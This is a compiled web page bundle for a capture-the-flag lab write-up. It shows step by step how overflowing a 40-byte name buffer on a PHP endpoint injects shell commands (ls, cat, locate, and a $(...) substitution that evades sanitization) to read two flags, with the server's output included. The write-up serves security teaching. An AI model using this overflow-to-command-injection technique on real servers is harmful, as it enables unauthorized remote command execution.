"use strict";(self.webpackChunkkgkb=self.webpackChunkkgkb||[]).push([[66597],{3124:(A,e,n)=>{n.r(e),n.d(e,{assets:()=>o,contentTitle:()=>c,default:()=>f,frontMatter:()=>a,metadata:()=>i,toc:()=>l});var t=n(74848),r=n(28453);const a={},c="Command Execution in Remote Server",i={id:"cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/cmd_execution_remote_server/README",title:"Command Execution in Remote Server",description:"This file contains instructions for completing the challenges found in Project ED201.",source:"@site/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/cmd_execution_remote_server/README.md",sourceDirName:"cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/cmd_execution_remote_server",slug:"/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/cmd_execution_remote_server/",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/cmd_execution_remote_server/",draft:!1,unlisted:!1,tags:[],version:"current",frontMatter:{},sidebar:"docsSidebar",previous:{title:"Buffer Overflow Exploit without Shellcode (Redirection of EIP) in 32bit Executable",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Binary/linux/buffer_overflow_cmd_injection/buffer_overflow_without_shellcode_32bit/"},next:{title:"Buffer_Overflow",permalink:"/docs/cybersecurity/Offensive/exploit_dev/Buffer_Overflow"}},o={},l=[{value:"Export endpoint for ease",id:"export-endpoint-for-ease",level:2},{value:"Initial fuzz, 40 characters",id:"initial-fuzz-40-characters",level:2},{value:"List flags in current working directory",id:"list-flags-in-current-working-directory",level:2},{value:"Getting <code>flag1</code>",id:"getting-flag1",level:2},{value:"Finding <code>flag2</code>",id:"finding-flag2",level:2},{value:"Getting <code>flag2</code>",id:"getting-flag2",level:2}];function s(A){const e={a:"a",code:"code",h1:"h1",h2:"h2",header:"header",p:"p",pre:"pre",...(0,r.R)(),...A.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.header,{children:(0,t.jsx)(e.h1,{id:"command-execution-in-remote-server",children:"Command Execution in Remote Server"})}),"\n",(0,t.jsxs)(e.p,{children:["This file contains instructions for completing the challenges found in ",(0,t.jsx)(e.a,{href:"https://samsclass.info/127/proj/ED201c.htm",children:"Project ED201"}),"."]}),"\n",(0,t.jsx)(e.p,{children:"The goal is to use shell commands to get the two flags inside a remote server."}),"\n",(0,t.jsx)(e.h2,{id:"export-endpoint-for-ease",children:"Export endpoint for ease"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"\u276f url=https://attack3214.samsclass.info/bufo1/bufo.php\n"})}),"\n",(0,t.jsx)(e.h2,{id:"initial-fuzz-40-characters",children:"Initial fuzz, 40 characters"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:'\u276f python3 -c "print(\'A\'*40)"      \n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n\n\u276f curl -X POST -H "content-type: application/x-www-form-urlencoded" -d "name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAA" $url\n\nYou sent <b>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</b><br>After sanitizing, it became <b>AAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAA</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo AAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAA</blockquote></b><hr><pre>Name buffer address:    bffffbb0                                         \nCommand buffer address: bffffbd8                                                                                 \nName: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                                                                   \nExecuting command:                                                                                               \n</pre><hr><p>%\n'})}),"\n",(0,t.jsx)(e.h2,{id:"list-flags-in-current-working-directory",children:"List flags in current working directory"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:'\u276f curl -X POST -H "content-type: application/x-www-form-urlencoded" -d "name=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls" $url                   \n\nYou sent <b>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls</b><br>After sanitizing, it became <b>AAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAls</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo AAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAls</blockquote></b><hr><pre>Name buffer address:    bffffbb0                                   \nCommand buffer address: bffffbd8                                                                                 \nName: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls                                                                 \nExecuting command: ls           \nbufo.htm                       \nbufo.php                     \nflag1         \nsecret                         \n</pre><hr><p>%\n'})}),"\n",(0,t.jsxs)(e.h2,{id:"getting-flag1",children:["Getting ",(0,t.jsx)(e.code,{children:"flag1"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"\u276f curl -X POST -H \"content-type: application/x-www-form-urlencoded\" -d \"name='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1'\" $url\n\nYou sent <b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1'</b><br>After sanitizing, it became <b>'AAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1'</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo 'AAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1'</blockquote></b><hr><pre>Name buffer address:    bffffbb0\nCommand buffer address: bffffbd8\nName: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat flag1\nExecuting command: cat flag1 \nplain-sight</pre><hr><p>%\n"})}),"\n",(0,t.jsxs)(e.h2,{id:"finding-flag2",children:["Finding ",(0,t.jsx)(e.code,{children:"flag2"})]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:"\u276f curl -X POST -H \"content-type: application/x-www-form-urlencoded\" -d \"name='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2'\" $url\n\nYou sent <b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2'</b><br>After sanitizing, it became <b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2'</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2'</blockquote><b><hr><pre>Name buffer address:    bffffba0\nCommand buffer address: bffffbc8\nName: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocate flag2\nExecuting command: locate flag2\n/var/www/html/bufo1/secret/flag2\n/var/www/html/chal/sub/flag2.txt\n</pre><hr><p>%\n"})}),"\n",(0,t.jsxs)(e.h2,{id:"getting-flag2",children:["Getting ",(0,t.jsx)(e.code,{children:"flag2"})]}),"\n",(0,t.jsx)(e.p,{children:"I used the more complex way of piping the output and taking the first row because the input was sanitized for slashes and dots:"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-bash",children:'\n\u276f curl -X POST -H "content-type: application/x-www-form-urlencoded" -d "name=\'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat \\$(locate flag2 | head -n1)\'" $url\n'})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-markup",children:"You sent <b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat $(locate flag2 | head -n1)'</b><br>After sanitizing, it became<b>'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat $(locate flag2 | head -n1'</b><p>Executing dash shell command<b><blockquote>/var/www/html/bufo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat $(locate flag2 | head -n1'<blockquote></b><hr><pre>Name buffer address:    bffffb90\nCommand buffer address: bffffbb8\nName: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcat $(locate flag2 | head -n1)\nExecuting command: cat $(locate flag2 | head -n1)\nharder</pre><hr><p>%\n"})})]})}function f(A={}){const{wrapper:e}={...(0,r.R)(),...A.components};return e?(0,t.jsx)(e,{...A,children:(0,t.jsx)(s,{...A})}):s(A)}},28453:(A,e,n)=>{n.d(e,{R:()=>c,x:()=>i});var t=n(96540);const r={},a=t.createContext(r);function c(A){const e=t.useContext(a);return t.useMemo((function(){return"function"==typeof A?A(e):{...e,...A}}),[e,A])}function i(A){let e;return e=A.disableParentContext?"function"==typeof A.components?A.components(r):A.components||r:c(A.components),t.createElement(a.Provider,{value:e},A.children)}}}]);